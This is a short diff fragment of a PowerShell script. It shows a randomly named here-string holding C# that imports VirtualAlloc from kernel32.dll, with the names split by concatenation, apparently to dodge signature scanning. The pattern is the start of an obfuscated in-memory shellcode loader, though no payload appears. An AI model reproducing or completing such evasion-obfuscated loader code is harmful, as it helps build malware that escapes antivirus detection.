@@ -1,5 +1,3 @@
-
-
 $rAnDoMvAr1 = @"
 [DllImport("ker"+"nel32"+"."+"dll")]
 public static extern IntPtr Virt"+"ualA"+"lloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
